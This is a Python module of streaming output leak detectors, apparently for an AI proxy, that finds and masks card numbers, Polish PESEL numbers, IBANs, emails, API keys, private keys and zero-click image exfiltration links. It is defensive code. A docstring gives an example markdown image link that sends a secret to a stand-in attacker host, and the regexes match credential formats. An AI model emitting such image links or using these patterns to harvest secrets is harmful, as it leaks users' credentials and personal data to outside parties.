"""Output leak detectors for the streaming scanner.

Every detector provides

* ``find(text, pos)`` – complete matches starting at or after ``pos``
  (lookbehind may inspect ``text[:pos]``), and
* a *hold* regex (ending in ``\\Z``) that matches any **incomplete prefix** of
  a match at the end of the text.  The stream channel holds such a tail back
  until it is complete, so a secret or an image link split across deltas is
  never half-emitted.  Hold patterns use lookbehind guards and possessive
  quantifiers so the per-delta cost stays O(tail).

These are deliberately self-contained (stdlib only).  The request-side DLP
engine can be plugged in by implementing the same small interface (see
:class:`Detector`).
"""

from __future__ import annotations

import datetime
import re
import unicodedata
from collections.abc import Iterable, Iterator
from dataclasses import dataclass
from urllib.parse import urlsplit

__all__ = [
    "Match",
    "Detector",
    "CreditCardDetector",
    "PeselDetector",
    "IbanDetector",
    "EmailDetector",
    "SecretDetector",
    "MarkdownImageDetector",
    "KnownValueDetector",
    "default_detectors",
    "DIGIT_HOLD",
    "WORD_HOLD",
]


@dataclass(frozen=True, slots=True)
class Match:
    start: int
    end: int
    type: str  # e.g. CREDIT_CARD, AWS_ACCESS_KEY_ID, MD_IMAGE_EXFIL
    category: str  # PCI | PII | SECRET | EXFIL | CANARY
    detector: str
    value: str  # raw matched text: never logged, used for preview/fingerprint only
    score: float = 1.0
    replacement: str | None = None  # detector-specific mask text


class Detector:
    """Base class / interface for stream leak detectors."""

    name: str = "detector"
    #: regex source(s) ending in ``\\Z`` matching an incomplete match prefix at the tail
    hold: str | tuple[str, ...] | None = None

    def find(self, text: str, pos: int) -> Iterator[Match]:  # pragma: no cover - interface
        raise NotImplementedError

    def hold_start(self, text: str) -> int | None:
        """Optional non-regex hold rule (return the start index of the held tail)."""
        return None

    def on_overlong(self, text: str, start: int) -> Match | None:
        """Called when this detector's hold exceeded ``max_holdback`` and the
        construct starting at ``text[start]`` is force-released incomplete."""
        return None


# ---------------------------------------------------------------- helpers
_ZW = "​‌‍⁠­"
_SEP = rf"[ \-.    {_ZW}]"
#: digit runs with separators (cards, PESEL, NRB, IBAN digits)
DIGIT_HOLD = rf"(?<!\w)\d(?:\d|{_SEP}){{0,48}}+\Z"
_WORD_CLS = r"[A-Za-z0-9._%+\-@]"
#: trailing token-ish word (emails, API keys, JWTs)
WORD_HOLD = rf"(?<!{_WORD_CLS}){_WORD_CLS}{{1,320}}+\Z"


def _ascii_digits(s: str) -> str:
    out = []
    for c in s:
        d = unicodedata.decimal(c, None)
        if d is not None:
            out.append(chr(48 + d))
    return "".join(out)


def luhn_ok(digits: str) -> bool:
    total = 0
    for i, c in enumerate(reversed(digits)):
        n = ord(c) - 48
        if i % 2:
            n = n * 2 - 9 if n > 4 else n * 2
        total += n
    return total % 10 == 0


# ------------------------------------------------------------- PCI / PII
class CreditCardDetector(Detector):
    """PAN: 13–19 digits (any Unicode digits, common separators), Luhn + IIN."""

    name = "luhn"
    hold = DIGIT_HOLD
    _re = re.compile(rf"(?<!\w)\d(?:{_SEP}?\d){{12,18}}(?!\d)")

    def find(self, text: str, pos: int) -> Iterator[Match]:
        while True:
            m = self._re.search(text, pos)
            if m is None:
                return
            # The regex is greedy (up to 19 digits).  Accept the longest prefix
            # that ends on a group boundary and validates, so "PAN CVV" and
            # back-to-back numbers are still found; resume after it.
            start, raw = m.start(), m.group()
            best = None
            ndig = 0
            for i, c in enumerate(raw):
                if unicodedata.decimal(c, None) is None:
                    continue
                ndig += 1
                if ndig >= 13 and (i + 1 == len(raw) or unicodedata.decimal(raw[i + 1], None) is None):
                    d = _ascii_digits(raw[: i + 1])
                    if d[0] in "23456" and len(set(d)) > 1 and luhn_ok(d):
                        best = i + 1
            if best is None:
                pos = m.end()
                continue
            yield Match(start, start + best, "CREDIT_CARD", "PCI", self.name, raw[:best], 0.95)
            pos = start + best


def pesel_ok(d: str) -> bool:
    if len(d) != 11 or not d.isdigit():
        return False
    weights = (1, 3, 7, 9, 1, 3, 7, 9, 1, 3)
    if (10 - sum(int(a) * b for a, b in zip(d, weights, strict=False)) % 10) % 10 != int(d[10]):
        return False
    yy, mm, dd = int(d[:2]), int(d[2:4]), int(d[4:6])
    century = {0: 1900, 20: 2000, 40: 2100, 60: 2200, 80: 1800}[mm - mm % 20]
    try:
        datetime.date(century + yy, mm % 20, dd)
    except ValueError:
        return False
    return True


class PeselDetector(Detector):
    name = "pesel"
    hold = DIGIT_HOLD
    _re = re.compile(r"(?<!\w)\d{11}(?!\w)")

    def find(self, text: str, pos: int) -> Iterator[Match]:
        for m in self._re.finditer(text, pos):
            if pesel_ok(_ascii_digits(m.group())):
                yield Match(m.start(), m.end(), "PL_PESEL", "PII", self.name, m.group(), 0.95)


_IBAN_LEN = {
    "AT": 20, "BE": 16, "BG": 22, "CH": 21, "CY": 28, "CZ": 24, "DE": 22, "DK": 18,
    "EE": 20, "ES": 24, "FI": 18, "FR": 27, "GB": 22, "GR": 27, "HR": 21, "HU": 28,
    "IE": 22, "IT": 27, "LT": 20, "LU": 20, "LV": 21, "MT": 31, "NL": 18, "NO": 15,
    "PL": 28, "PT": 25, "RO": 24, "SE": 24, "SI": 19, "SK": 24, "UA": 29,
}  # fmt: skip


def _iban_mod97(s: str) -> bool:
    s = s[4:] + s[:4]
    num = "".join(str(int(c, 36)) for c in s)
    return int(num) % 97 == 1


class IbanDetector(Detector):
    name = "iban"
    hold = (r"(?<![A-Za-z0-9])[A-Z]{1,2}(?:\d{1,2}(?: ?[A-Z0-9]){0,32}+ ?)?\Z", DIGIT_HOLD)
    _re = re.compile(r"(?<![A-Za-z0-9])[A-Z]{2}\d{2}(?: ?[A-Z0-9]){11,32}")

    def find(self, text: str, pos: int) -> Iterator[Match]:
        while True:
            m = self._re.search(text, pos)
            if m is None:
                return
            raw = m.group()
            compact = raw.replace(" ", "")
            want = _IBAN_LEN.get(compact[:2])
            lengths = [want] if want else list(range(min(len(compact), 34), 14, -1))
            found = None
            for ln in lengths:
                if len(compact) < ln or not _iban_mod97(compact[:ln]):
                    continue
                seen = 0  # map ln alnum chars back to an end offset in raw
                for i, c in enumerate(raw):
                    if c != " ":
                        seen += 1
                        if seen == ln:
                            end = m.start() + i + 1
                            break
                if end < len(text) and text[end].isalnum():
                    continue  # glued to more alnum chars: not a clean IBAN
                found = end
                break
            if found is None:
                pos = m.start() + 1
                continue
            yield Match(m.start(), found, "IBAN", "PII", self.name, text[m.start() : found], 0.95)
            pos = found


_DEFAULT_EMAIL_ALLOW = ("example.com", "example.org", "example.net", "example.pl", "localhost")


class EmailDetector(Detector):
    name = "email"
    hold = WORD_HOLD
    _re = re.compile(
        rf"(?<!{_WORD_CLS})[A-Za-z0-9._%+\-]{{1,64}}@[A-Za-z0-9](?:[A-Za-z0-9\-]{{0,61}}[A-Za-z0-9])?"
        r"(?:\.[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*\.[A-Za-z]{2,24}(?![A-Za-z0-9\-])"
    )

    def __init__(self, allow_domains: Iterable[str] = _DEFAULT_EMAIL_ALLOW) -> None:
        self.allow = tuple(d.lower().lstrip(".") for d in allow_domains)

    def find(self, text: str, pos: int) -> Iterator[Match]:
        if text.find("@", pos) == -1:
            return
        for m in self._re.finditer(text, pos):
            dom = m.group().rsplit("@", 1)[1].lower()
            if any(dom == a or dom.endswith("." + a) for a in self.allow):
                continue
            yield Match(m.start(), m.end(), "EMAIL", "PII", self.name, m.group(), 0.9)


# ----------------------------------------------------------------- secrets
_SECRET_RULES: tuple[tuple[str, str], ...] = (
    ("ANTHROPIC_API_KEY", r"sk-ant-[A-Za-z0-9_\-]{20,300}"),
    ("OPENAI_API_KEY", r"sk-(?!ant-)(?:proj-|svcacct-|admin-)?[A-Za-z0-9_\-]{20,300}"),
    ("AWS_ACCESS_KEY_ID", r"(?:AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}"),
    ("GITHUB_TOKEN", r"gh[pousr]_[A-Za-z0-9]{36,255}|github_pat_[A-Za-z0-9_]{22,255}"),
    ("SLACK_TOKEN", r"xox[abposr]-[A-Za-z0-9\-]{10,250}"),
    ("GOOGLE_API_KEY", r"AIza[0-9A-Za-z_\-]{35}"),
    ("STRIPE_SECRET_KEY", r"(?:sk|rk)_live_[0-9A-Za-z]{24,99}"),
    ("JWT", r"eyJ[A-Za-z0-9_\-]{8,}\.eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}"),
)
_PEM_RE = re.compile(r"-----BEGIN (?:[A-Z0-9]+ )*PRIVATE KEY-----")
_PEM_HOLD = r"-{1,5}(?:BEGIN(?: [A-Z0-9 ]{0,40}+-{0,5})?|BEGI|BEG|BE|B)?\Z"


class SecretDetector(Detector):
    """High-signal credential formats (gitleaks-style prefixes) + PEM private keys."""

    name = "secrets"
    hold = (WORD_HOLD, _PEM_HOLD)

    def __init__(self, rules: Iterable[tuple[str, str]] = _SECRET_RULES) -> None:
        self.rules = tuple(rules)
        alts = "|".join(f"(?P<{n}>{p})" for n, p in self.rules)
        self._re = re.compile(rf"(?<![A-Za-z0-9_\-])(?:{alts})(?![A-Za-z0-9_\-])")

    def find(self, text: str, pos: int) -> Iterator[Match]:
        for m in self._re.finditer(text, pos):
            yield Match(m.start(), m.end(), m.lastgroup or "SECRET", "SECRET", self.name, m.group(), 0.98)
        if "-----BEGIN" in text:
            for m in _PEM_RE.finditer(text, pos):
                yield Match(m.start(), m.end(), "PRIVATE_KEY", "SECRET", self.name, m.group(), 1.0)


# --------------------------------------------------------- image exfiltration
_MD_IMG = re.compile(
    r"!\[[^\]\n]{0,1000}\]\(\s*<?(?P<url>[^)\s>]{1,4096})>?(?:\s+(?:\"[^\"\n]{0,512}\"|'[^'\n]{0,512}'))?\s*\)"
)
_HTML_IMG = re.compile(
    r"<img\b[^>]{0,4096}?\bsrc\s*=\s*\\?[\"']?(?P<url>[^\"'\s>\\]{1,4096})[^>]{0,4096}>", re.I
)
_MD_HOLD = (
    r"!(?:\[[^\]\n]{0,1000}+(?:\](?:\(\s*<?[^)\s>]{0,4096}+"
    r"(?:>?(?:\s+(?:\"[^\"\n]{0,512}+\"?|'[^'\n]{0,512}+'?)?\s*)?)?)?)?)?\Z"
)
_HTML_HOLD = r"(?i:<(?:i(?:m(?:g(?:\b[^>]{0,4096}+)?)?)?)?)\Z"


class MarkdownImageDetector(Detector):
    """Zero-click exfiltration via images the client auto-renders.

    ``![x](https://evil.example/c?d=<secret>)`` or ``<img src=...>`` pointing
    at a host outside ``allowed_hosts``.  The whole construct is held back
    until it is complete, so a blocked/masked image never reaches the client
    in renderable form.
    """

    name = "md-image"
    hold = (_MD_HOLD, _HTML_HOLD)

    def __init__(self, allowed_hosts: Iterable[str] = ()) -> None:
        self.allowed = tuple(h.lower().lstrip(".") for h in allowed_hosts)

    def _host_if_external(self, url: str) -> str | None:
        url = url.replace("\\/", "/")
        if url.startswith("//"):
            url = "https:" + url
        try:
            parts = urlsplit(url)
        except ValueError:
            return "invalid-url"
        if parts.scheme.lower() in ("", "data"):
            return None
        host = (parts.hostname or "").lower()
        if host and any(host == a or host.endswith("." + a) for a in self.allowed):
            return None
        return host or parts.scheme.lower()

    def find(self, text: str, pos: int) -> Iterator[Match]:
        if text.find("!", pos) != -1:
            for m in _MD_IMG.finditer(text, pos):
                host = self._host_if_external(m.group("url"))
                if host is not None:
                    yield Match(m.start(), m.end(), "MD_IMAGE_EXFIL", "EXFIL", self.name, m.group(),
                                0.9, f"[image removed by aegis: {host}]")
        if text.find("<", pos) != -1:
            for m in _HTML_IMG.finditer(text, pos):
                host = self._host_if_external(m.group("url"))
                if host is not None:
                    yield Match(m.start(), m.end(), "MD_IMAGE_EXFIL", "EXFIL", self.name, m.group(),
                                0.9, f"[image removed by aegis: {host}]")

    def on_overlong(self, text: str, start: int) -> Match | None:
        # An image construct longer than the hold-back window: neutralise its
        # opener so it can never render ("![" -> "[", "<img" -> "&lt;img").
        if text.startswith("!", start):
            return Match(start, start + 1, "MD_IMAGE_EXFIL", "EXFIL", self.name, text[start:start + 64], 0.8, "")
        if text.startswith("<", start):
            return Match(start, start + 1, "MD_IMAGE_EXFIL", "EXFIL", self.name, text[start:start + 64], 0.8, "&lt;")
        return None


# ---------------------------------------------------------------- canaries
class KnownValueDetector(Detector):
    """Exact known strings: canary tokens, deny-terms, or the session vault's
    *real* values (a real value in raw upstream output means it leaked to the
    remote side through some other path)."""

    name = "known-value"

    def __init__(
        self, values: Iterable[str], *, type: str = "CANARY", category: str = "CANARY", min_len: int = 4
    ) -> None:
        vals = sorted({v for v in values if v and len(v) >= min_len}, key=len, reverse=True)
        self.type, self.category = type, category
        self._re = re.compile("|".join(map(re.escape, vals))) if vals else None
        self._prefixes = {v[:k] for v in vals for k in range(1, len(v))}
        self._maxlen = max((len(v) for v in vals), default=0)

    def find(self, text: str, pos: int) -> Iterator[Match]:
        if self._re is None:
            return
        for m in self._re.finditer(text, pos):
            yield Match(m.start(), m.end(), self.type, self.category, self.name, m.group(), 1.0)

    def hold_start(self, text: str) -> int | None:
        n = len(text)
        for k in range(min(self._maxlen - 1, n), 0, -1):
            if text[n - k :] in self._prefixes:
                return n - k
        return None


def default_detectors(
    *,
    allowed_image_hosts: Iterable[str] = (),
    email_allow_domains: Iterable[str] = _DEFAULT_EMAIL_ALLOW,
    canaries: Iterable[str] = (),
) -> list[Detector]:
    dets: list[Detector] = [
        SecretDetector(),
        CreditCardDetector(),
        PeselDetector(),
        IbanDetector(),
        EmailDetector(email_allow_domains),
        MarkdownImageDetector(allowed_image_hosts),
    ]
    canaries = list(canaries)
    if canaries:
        dets.append(KnownValueDetector(canaries))
    return dets
